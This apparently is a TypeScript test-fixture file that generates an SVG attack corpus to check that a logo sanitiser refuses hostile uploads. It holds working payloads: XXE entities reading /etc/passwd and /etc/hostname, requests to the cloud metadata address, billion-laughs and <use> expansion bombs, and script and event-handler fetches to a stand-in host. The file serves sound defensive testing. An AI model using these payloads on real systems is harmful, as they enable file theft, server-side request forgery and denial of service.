import { gzipSync } from "node:zlib";
import sharp from "sharp";
import { paletteCrashPng, svgLogo } from "./hostile-svg-fixtures";
import { buildJpeg } from "./image-fixtures";

/**
 * The SVG attack corpus for the brand-logo paths (loadBrandLogo, POST
 * /api/brand/logo-colors and the POST /api/upload SVG gate), built in memory
 * (no binaries in the repo). FEAT-033 round-4 critic: the sanitiser had been
 * read but never attacked.
 *
 * `expect` is what every path must do with the file:
 *  - "refused": the sanitiser refuses it, so the upload answers 400, the
 *    logo loader reports a fault, and logo-colors answers 422.
 *  - "drawn": accepted everywhere, and the logo is drawn on a design.
 *  - "not_svg": not an SVG at all to the byte sniff (svgz, UTF-16); the
 *    upload still refuses it, and the other paths refuse it as an unknown
 *    format.
 */

export type SvgAttackExpectation = "refused" | "drawn" | "not_svg";

export interface SvgAttack {
  name: string;
  bytes: Uint8Array;
  expect: SvgAttackExpectation;
}

const XLINK = "http://www.w3.org/1999/xlink";
const SVG_NS = "http://www.w3.org/2000/svg";
const b64 = (bytes: Uint8Array | string) =>
  Buffer.from(bytes).toString("base64");
const text = (s: string) => new TextEncoder().encode(s);

/* Deterministic, so a failure reproduces byte for byte. */
function noise(length: number, seed: number): Buffer {
  const out = Buffer.alloc(length);
  let state = seed;
  for (let i = 0; i < length; i += 1) {
    state = (Math.imul(state, 1103515245) + 12345) & 0x7fffffff;
    out[i] = state >>> 23;
  }
  return out;
}

const GRADIENT =
  '<defs><linearGradient id="g"><stop offset="0" stop-color="#0ff"/><stop offset="1" stop-color="#f0f"/></linearGradient><circle id="d" r="10" fill="#0a0"/></defs>';

/** A tall logo filled edge to edge with incompressible pixels. */
export function tallNoisyLogos(noisePng: Buffer): Record<string, string> {
  const uses: string[] = [];
  for (let y = 0; y < 4096; y += 512) {
    for (let x = 0; x < 600; x += 512)
      uses.push(`<use href="#n" x="${x}" y="${y}"/>`);
  }
  return {
    "tall-noise-tiled-png.svg": `<svg xmlns="${SVG_NS}" viewBox="0 0 600 4096"><defs><image id="n" width="512" height="512" href="data:image/png;base64,${b64(noisePng)}"/></defs>${uses.join("")}</svg>`,
    "tall-noise-feturbulence.svg": `<svg xmlns="${SVG_NS}" viewBox="0 0 600 4096"><filter id="t" x="0" y="0" width="1" height="1"><feTurbulence type="fractalNoise" baseFrequency="0.95" numOctaves="8" seed="3"/></filter><rect width="600" height="4096" filter="url(#t)"/></svg>`,
  };
}

export async function noisePng512(): Promise<Buffer> {
  return sharp(noise(512 * 512 * 4, 3), {
    raw: { width: 512, height: 512, channels: 4 },
  })
    .png()
    .toBuffer();
}

export async function svgAttackCorpus(): Promise<SvgAttack[]> {
  const crash = await paletteCrashPng();
  const crashUri = `data:image/png;base64,${b64(crash)}`;
  const png = await sharp({
    create: { width: 40, height: 40, channels: 4, background: "#f97316cc" },
  })
    .png()
    .toBuffer();
  const pngB64 = b64(png);
  const jpeg = buildJpeg(40, 40);
  const gif = Buffer.from(
    "R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7",
    "base64",
  );
  const bigPng = await sharp({
    create: { width: 4097, height: 4097, channels: 3, background: "#000" },
  })
    .png({ compressionLevel: 9 })
    .toBuffer();
  const nested = svgLogo(`<image width="64" height="64" href="${crashUri}"/>`);
  const plainNested = svgLogo('<circle cx="20" cy="20" r="10" fill="#f00"/>');
  const img = (href: string, attr = "href") =>
    svgLogo(`<image width="40" height="40" ${attr}="${href}"/>`);

  const svgs: Record<string, [string | Uint8Array, SvgAttackExpectation]> = {
    /* Entities: a DOCTYPE in any form, and entities without one. */
    "entity-internal.svg": [
      `<!DOCTYPE svg [<!ENTITY a "Acme">]><svg xmlns="${SVG_NS}" viewBox="0 0 200 80"><text y="40">&a;</text></svg>`,
      "refused",
    ],
    "entity-billion-laughs.svg": [
      `<!DOCTYPE svg [<!ENTITY a "aaaaaaaaaa"><!ENTITY b "&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;"><!ENTITY c "&b;&b;&b;&b;&b;&b;&b;&b;&b;&b;"><!ENTITY d "&c;&c;&c;&c;&c;&c;&c;&c;&c;&c;"><!ENTITY e "&d;&d;&d;&d;&d;&d;&d;&d;&d;&d;"><!ENTITY f "&e;&e;&e;&e;&e;&e;&e;&e;&e;&e;">]><svg xmlns="${SVG_NS}" viewBox="0 0 200 80"><text y="40">&f;&f;&f;&f;&f;&f;</text></svg>`,
      "refused",
    ],
    "entity-external-system.svg": [
      `<?xml version="1.0"?><!DOCTYPE svg [<!ENTITY x SYSTEM "file:///etc/hostname">]><svg xmlns="${SVG_NS}" viewBox="0 0 200 80"><text y="40">&x;</text></svg>`,
      "refused",
    ],
    "entity-parameter.svg": [
      `<!DOCTYPE svg [<!ENTITY % p SYSTEM "http://169.254.169.254/latest/meta-data/"> %p;]><svg xmlns="${SVG_NS}"/>`,
      "refused",
    ],
    "entity-public-doctype.svg": [
      `<!DOCTYPE svg PUBLIC "-//W3C//DTD SVG 1.1//EN" "http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd"><svg xmlns="${SVG_NS}" viewBox="0 0 200 80"><rect width="50" height="20"/></svg>`,
      "refused",
    ],
    "entity-undeclared.svg": [
      `<svg xmlns="${SVG_NS}" viewBox="0 0 200 80"><text y="40">&nbsp;</text></svg>`,
      "refused",
    ],
    "entity-charref-href.svg": [
      img("&#104;ttp://169.254.169.254/x"),
      "refused",
    ],
    "entity-charref-text.svg": [
      svgLogo('<text y="60" fill="#000">&#65;&#x63;me &amp; Co</text>'),
      "drawn",
    ],

    /* CDATA: in a style block, as text, and as a script body. */
    "cdata-style-external.svg": [
      svgLogo(
        "<style><![CDATA[rect{fill:url(http://x.test/a.svg#g)}]]></style>",
      ),
      "refused",
    ],
    "cdata-style-fragment.svg": [
      svgLogo(`${GRADIENT}<style><![CDATA[rect{fill:url(#g)}]]></style>`),
      "drawn",
    ],
    "cdata-markup-as-text.svg": [
      svgLogo(
        '<text y="60"><![CDATA[<image href="http://x.test/a.png"/> & ]]>more</text>',
      ),
      "drawn",
    ],
    "cdata-script.svg": [
      svgLogo("<script><![CDATA[fetch('http://x.test')]]></script>"),
      "refused",
    ],
    "script-element.svg": [
      svgLogo('<script href="http://x.test/a.js"/>'),
      "refused",
    ],
    "event-handler-attribute.svg": [
      svgLogo('<circle r="10" onload="fetch(\'http://x.test\')"/>'),
      "refused",
    ],

    /* Namespaces and prefixed hrefs. */
    "ns-xlink-under-another-prefix.svg": [
      `<svg xmlns="${SVG_NS}" xmlns:q="${XLINK}" viewBox="0 0 200 80"><image width="40" height="40" q:href="http://x.test/a.png"/></svg>`,
      "refused",
    ],
    "ns-href-in-foreign-namespace.svg": [
      `<svg xmlns="${SVG_NS}" xmlns:z="urn:z" viewBox="0 0 200 80"><use z:href="http://x.test/a.svg#a"/></svg>`,
      "refused",
    ],
    "ns-unbound-prefix.svg": [
      `<svg xmlns="${SVG_NS}" viewBox="0 0 200 80"><image width="40" height="40" xlink:href="data:image/png;base64,${pngB64}"/></svg>`,
      "refused",
    ],
    "ns-root-xhtml.svg": [
      '<svg xmlns="http://www.w3.org/1999/xhtml" viewBox="0 0 200 80"><rect width="50" height="20"/></svg>',
      "refused",
    ],
    "ns-root-prefixed.svg": [
      `<s:svg xmlns:s="${SVG_NS}" viewBox="0 0 200 80"><s:rect width="120" height="40" fill="#123456"/></s:svg>`,
      "drawn",
    ],
    "ns-xinclude.svg": [
      svgLogo(
        '<xi:include xmlns:xi="http://www.w3.org/2001/XInclude" href="file:///etc/passwd" parse="text"/>',
      ),
      "refused",
    ],
    "ns-xml-base.svg": [
      svgLogo(
        '<g xml:base="http://169.254.169.254/latest/"><use href="#d"/></g><circle id="d" r="10"/>',
      ),
      "refused",
    ],
    "ns-default-reset-child.svg": [
      svgLogo(`<image xmlns="" width="40" height="40" href="${crashUri}"/>`),
      "refused",
    ],

    /* xlink:href against href. */
    "href-and-xlink-external.svg": [
      svgLogo(`${GRADIENT}<use href="#d" xlink:href="http://x.test/a.svg#d"/>`),
      "refused",
    ],
    "xlink-fragment.svg": [
      svgLogo(`${GRADIENT}<use xlink:href="#d" x="150" y="40"/>`),
      "drawn",
    ],
    "href-whitespace-before-hash.svg": [
      svgLogo(`${GRADIENT}<use href=" http://x.test/#d"/>`),
      "refused",
    ],

    /* Nested svg. */
    "nested-svg-crash-png.svg": [
      svgLogo(
        `<svg x="0" y="0" width="64" height="64"><image width="64" height="64" href="${crashUri}"/></svg>`,
      ),
      "refused",
    ],
    "nested-svg-plain.svg": [
      svgLogo(
        '<svg x="100" y="10" width="60" height="60" viewBox="0 0 10 10"><circle cx="5" cy="5" r="4" fill="#f00"/></svg>',
      ),
      "drawn",
    ],
    "nested-svg-data-uri.svg": [
      img(`data:image/svg+xml;base64,${b64(plainNested)}`),
      "refused",
    ],

    /* use, feImage, pattern, mask, filter, clip-path, marker. */
    "use-external-file.svg": [svgLogo('<use href="logo2.svg#a"/>'), "refused"],
    "use-data-uri.svg": [
      svgLogo(`<use href="data:image/svg+xml;base64,${b64(plainNested)}#a"/>`),
      "refused",
    ],
    "feimage-data-png.svg": [
      svgLogo(
        `<filter id="f"><feImage href="data:image/png;base64,${pngB64}"/></filter><rect width="40" height="40" filter="url(#f)"/>`,
      ),
      "refused",
    ],
    "feimage-crash-png.svg": [
      svgLogo(
        `<filter id="f"><feImage xlink:href="${crashUri}"/></filter><rect width="40" height="40" filter="url(#f)"/>`,
      ),
      "refused",
    ],
    "feimage-fragment.svg": [
      svgLogo(
        `${GRADIENT}<filter id="f"><feImage href="#d"/></filter><rect x="130" width="60" height="60" filter="url(#f)"/>`,
      ),
      "drawn",
    ],
    "pattern-href-external.svg": [
      svgLogo(
        '<pattern id="p" href="http://x.test/p.svg#p" width="10" height="10"/><rect width="40" height="40" fill="url(#p)"/>',
      ),
      "refused",
    ],
    "mask-url-external.svg": [
      svgLogo(
        '<rect width="40" height="40" mask="url(http://x.test/m.svg#m)"/>',
      ),
      "refused",
    ],
    "filter-url-file.svg": [
      svgLogo(
        '<rect width="40" height="40" filter="url(file:///tmp/f.svg#f)"/>',
      ),
      "refused",
    ],
    "fragments-everywhere.svg": [
      svgLogo(
        `${GRADIENT}<pattern id="p" width="8" height="8" patternUnits="userSpaceOnUse"><rect width="4" height="4" fill="#f80"/></pattern><mask id="m"><rect width="200" height="80" fill="#fff"/></mask><clipPath id="c"><rect width="190" height="70"/></clipPath><marker id="k" markerWidth="4" markerHeight="4"><circle r="2"/></marker><filter id="f"><feGaussianBlur stdDeviation="1"/></filter><rect x="130" width="60" height="60" fill="url(#p)" mask="url(#m)" clip-path="url(#c)" filter="url(#f)"/><path d="M10 70 L60 70" stroke="url(#g)" marker-end="url(#k)"/>`,
      ),
      "drawn",
    ],
    "use-exponential.svg": [useBomb(), "refused"],
    "use-long-chain.svg": [useChain(20_000), "refused"],
    "use-cycle.svg": [
      svgLogo('<g id="a"><use href="#b"/></g><g id="b"><use href="#a"/></g>'),
      "refused",
    ],

    /* CSS url() in style attributes and style elements. */
    "css-attr-url-external.svg": [
      svgLogo(
        '<rect width="40" height="40" style="fill:url(http://x.test/a.svg#g)"/>',
      ),
      "refused",
    ],
    "css-attr-url-quoted-upper.svg": [
      svgLogo(
        `<rect width="40" height="40" fill="URL( 'http://x.test/a.svg#g' )"/>`,
      ),
      "refused",
    ],
    "css-attr-escape.svg": [
      svgLogo(
        '<rect width="40" height="40" style="fill:u\\72l(http://x.test/a)"/>',
      ),
      "refused",
    ],
    "css-attr-charref-paren.svg": [
      svgLogo('<rect width="40" height="40" fill="url&#40;http://x.test/a)"/>'),
      "refused",
    ],
    "css-attr-data-uri.svg": [
      svgLogo(
        `<rect width="40" height="40" style="fill:url('data:image/png;base64,${pngB64}')"/>`,
      ),
      "refused",
    ],
    "css-style-import.svg": [
      svgLogo('<style>@import "http://x.test/a.css";</style>'),
      "refused",
    ],
    "css-style-escape.svg": [
      svgLogo("<style>rect{fill:\\75rl(http://x.test/a)}</style>"),
      "refused",
    ],
    "css-style-font-face.svg": [
      svgLogo(
        "<style>@font-face{font-family:f;src:url(http://x.test/f.woff)}</style>",
      ),
      "refused",
    ],
    "css-style-comment-split.svg": [
      svgLogo("<style>rect{fill:url/**/(http://x.test/a)}</style>"),
      "drawn",
    ],
    "css-style-image-set.svg": [
      svgLogo(
        `<rect width="40" height="40" style="fill:image-set('http://x.test/a.png' 1x)"/>`,
      ),
      "drawn",
    ],
    "css-style-fragment.svg": [
      svgLogo(
        `${GRADIENT}<style>.x{fill:url(#g)}</style><rect class="x" x="130" width="60" height="60"/>`,
      ),
      "drawn",
    ],
    "pi-xml-stylesheet.svg": [
      `<?xml version="1.0"?><?xml-stylesheet type="text/css" href="http://x.test/a.css"?>${svgLogo()}`,
      "drawn",
    ],

    /* foreignObject and other namespaces: left out of the document, so
       drawn, and nothing of them reaches storage (round-5 review). */
    "foreignobject-html-img.svg": [
      svgLogo(
        '<foreignObject width="100" height="50"><div xmlns="http://www.w3.org/1999/xhtml"><img src="http://169.254.169.254/x"/></div></foreignObject>',
      ),
      "drawn",
    ],
    "xhtml-iframe-srcdoc.svg": [
      svgLogo(
        '<h:iframe xmlns:h="http://www.w3.org/1999/xhtml" srcdoc="&lt;script&gt;alert(1)&lt;/script&gt;"/>',
      ),
      "drawn",
    ],
    "xhtml-meta-refresh.svg": [
      svgLogo(
        '<h:meta xmlns:h="http://www.w3.org/1999/xhtml" http-equiv="refresh" content="0;url=javascript:alert(1)"/>',
      ),
      "drawn",
    ],
    "foreignobject-html-form.svg": [
      svgLogo(
        '<foreignObject width="9" height="9"><form xmlns="http://www.w3.org/1999/xhtml" action="javascript:alert(1)"><button>go</button></form></foreignObject>',
      ),
      "drawn",
    ],
    "inkscape-editor-state.svg": [
      svgLogo(
        '<sodipodi:namedview xmlns:sodipodi="http://sodipodi.sourceforge.net/DTD/sodipodi-0.dtd" pagecolor="#ffffff"/>',
      ),
      "drawn",
    ],
    "set-onclick.svg": [
      svgLogo('<set attributeName="onclick" to="alert(1)"/>'),
      "refused",
    ],
    "animate-onload.svg": [
      svgLogo('<animate attributeName="onload" values="alert(1)"/>'),
      "refused",
    ],
    "foreignobject-html-text.svg": [
      svgLogo(
        '<foreignObject width="100" height="50"><p xmlns="http://www.w3.org/1999/xhtml">Acme</p></foreignObject>',
      ),
      "drawn",
    ],

    /* Huge dimensions and structure. */
    "huge-width-attribute.svg": [
      `<svg xmlns="${SVG_NS}" width="100000000" height="1"><rect width="100000000" height="1" fill="#123"/></svg>`,
      "refused",
    ],
    "huge-viewbox-tall.svg": [
      `<svg xmlns="${SVG_NS}" viewBox="0 0 1 1000000"><rect width="1" height="1000000" fill="#123"/></svg>`,
      "refused",
    ],
    "huge-viewbox-exponent.svg": [
      `<svg xmlns="${SVG_NS}" viewBox="0 0 1e308 1e308"><rect width="1e308" height="1e308" fill="#123"/></svg>`,
      "refused",
    ],
    "wordmark-20-to-1.svg": [
      `<svg xmlns="${SVG_NS}" viewBox="0 0 2000 100"><rect width="2000" height="100" rx="20" fill="#0f172a"/><text x="40" y="70" font-size="60" fill="#f97316">ACME WORKS</text></svg>`,
      "drawn",
    ],
    "huge-viewbox-negative.svg": [
      `<svg xmlns="${SVG_NS}" viewBox="0 0 -200 80"><rect width="120" height="40" fill="#123"/></svg>`,
      "drawn",
    ],
    "huge-blur.svg": [
      svgLogo(
        '<filter id="f"><feGaussianBlur stdDeviation="1000000000"/></filter><rect width="120" height="40" filter="url(#f)"/>',
      ),
      "drawn",
    ],
    "deep-nesting.svg": [
      svgLogo(
        `${"<g>".repeat(5000)}<rect width="10" height="10"/>${"</g>".repeat(5000)}`,
      ),
      "refused",
    ],
    "long-element-name.svg": [svgLogo(`<${"a".repeat(60_000)}/>`), "refused"],
    "long-attribute-name.svg": [
      svgLogo(`<rect width="10" height="10" ${"a".repeat(60_000)}="1"/>`),
      "refused",
    ],
    "many-attributes.svg": [
      svgLogo(
        `<rect width="10" height="10" ${Array.from({ length: 20_000 }, (_, i) => `a${i}="1"`).join(" ")}/>`,
      ),
      "drawn",
    ],
    "elements-at-limit.svg": [
      svgLogo('<rect width="1" height="1"/>'.repeat(49_998)),
      "drawn",
    ],
    "elements-over-limit.svg": [
      svgLogo('<rect width="1" height="1"/>'.repeat(50_000)),
      "refused",
    ],
    "over-5mb.svg": [
      svgLogo(`<desc>${"x".repeat(5 * 1024 * 1024)}</desc>`),
      "refused",
    ],

    /* Data URIs: odd media types, padding, sniffing. */
    "data-png-parameter.svg": [
      img(`data:image/png;charset=utf-8;base64,${pngB64}`),
      "refused",
    ],
    "data-svg-utf8.svg": [img("data:image/svg+xml;utf8,<svg/>"), "refused"],
    "data-gif.svg": [img(`data:image/gif;base64,${b64(gif)}`), "refused"],
    "data-png-holding-jpeg.svg": [
      img(`data:image/png;base64,${b64(jpeg)}`),
      "drawn",
    ],
    "data-png-holding-svg.svg": [
      img(`data:image/png;base64,${b64(plainNested)}`),
      "refused",
    ],
    "data-png-holding-gif.svg": [
      img(`data:image/png;base64,${b64(gif)}`),
      "refused",
    ],
    "data-upper-case.svg": [img(`DATA:IMAGE/PNG;BASE64,${pngB64}`), "drawn"],
    "data-base64-triple-padding.svg": [
      img(`data:image/png;base64,${pngB64}===`),
      "refused",
    ],
    "data-base64-mid-padding.svg": [
      img(`data:image/png;base64,${pngB64.slice(0, 8)}=${pngB64.slice(8)}`),
      "refused",
    ],
    "data-base64-no-padding.svg": [
      img(`data:image/png;base64,${pngB64.replace(/=+$/, "")}`),
      "drawn",
    ],
    "data-base64-line-breaks.svg": [
      img(`data:image/png;base64,${pngB64.replace(/(.{76})/g, "$1&#10;")}`),
      "drawn",
    ],
    "data-base64-url-safe.svg": [
      img(
        `data:image/png;base64,${pngB64.replaceAll("+", "-").replaceAll("/", "_")}x-_`,
      ),
      "refused",
    ],
    "data-base64-empty.svg": [img("data:image/png;base64,"), "refused"],
    "data-png-over-pixel-limit.svg": [
      img(`data:image/png;base64,${b64(bigPng)}`),
      "refused",
    ],
    "data-nine-images.svg": [
      svgLogo(
        Array.from(
          { length: 9 },
          (_, i) =>
            `<image x="${i * 20}" width="20" height="20" href="data:image/png;base64,${pngB64}"/>`,
        ).join(""),
      ),
      "refused",
    ],
    "data-eight-images.svg": [
      svgLogo(
        Array.from(
          { length: 8 },
          (_, i) =>
            `<image x="${i * 20}" width="20" height="20" href="data:image/png;base64,${pngB64}"/>`,
        ).join(""),
      ),
      "drawn",
    ],
    "data-on-a-element.svg": [
      svgLogo(
        `<a href="data:image/png;base64,${pngB64}"><rect width="10" height="10"/></a>`,
      ),
      "refused",
    ],
    "a-javascript.svg": [
      svgLogo(
        '<a href="javascript:alert(1)"><rect width="10" height="10"/></a>',
      ),
      "refused",
    ],
    "animate-href.svg": [
      svgLogo(
        `${GRADIENT}<use href="#d"><set attributeName="href" to="http://x.test/a.svg#d"/></use>`,
      ),
      "refused",
    ],

    /* The round-3 abort, three ways. */
    "plte-len4-href.svg": [img(crashUri), "refused"],
    "plte-len4-xlink-href.svg": [img(crashUri, "xlink:href"), "refused"],
    "plte-len4-nested-svg-data-uri.svg": [
      img(`data:image/svg+xml;base64,${b64(nested)}`),
      "refused",
    ],

    /* Encodings. */
    "svgz.svg": [gzipSync(Buffer.from(svgLogo())), "not_svg"],
    "utf16.svg": [
      Buffer.concat([
        Buffer.from([0xff, 0xfe]),
        Buffer.from(svgLogo(), "utf16le"),
      ]),
      "not_svg",
    ],
    "utf8-bom.svg": [
      Buffer.concat([Buffer.from([0xef, 0xbb, 0xbf]), Buffer.from(svgLogo())]),
      "drawn",
    ],

    /* Round-4 critic C4. */
    ...Object.fromEntries(
      Object.entries(tallNoisyLogos(await noisePng512())).map(([name, svg]) => [
        name,
        [svg, "drawn"] as [string, SvgAttackExpectation],
      ]),
    ),
  };

  return Object.entries(svgs).map(([name, [svg, expect]]) => ({
    name,
    bytes: typeof svg === "string" ? text(svg) : svg,
    expect,
  }));
}

/* Ten levels of ten <use> each: 10^10 instances if expanded. */
function useBomb(): string {
  let defs = '<g id="l0"><rect width="1" height="1"/></g>';
  for (let level = 1; level <= 10; level += 1) {
    const uses = Array.from(
      { length: 10 },
      () => `<use href="#l${level - 1}"/>`,
    ).join("");
    defs += `<g id="l${level}">${uses}</g>`;
  }
  return svgLogo(`<defs>${defs}</defs><use href="#l10"/>`);
}

/* Each group uses the one before it: linear, not exponential, but as deep
   as the chain is long for any renderer that follows it recursively. */
function useChain(length: number): string {
  const groups = ['<g id="c0"><rect width="1" height="1"/></g>'];
  for (let i = 1; i < length; i += 1) {
    groups.push(`<g id="c${i}"><use href="#c${i - 1}"/></g>`);
  }
  return svgLogo(
    `<defs>${groups.join("")}</defs><use href="#c${length - 1}"/>`,
  );
}
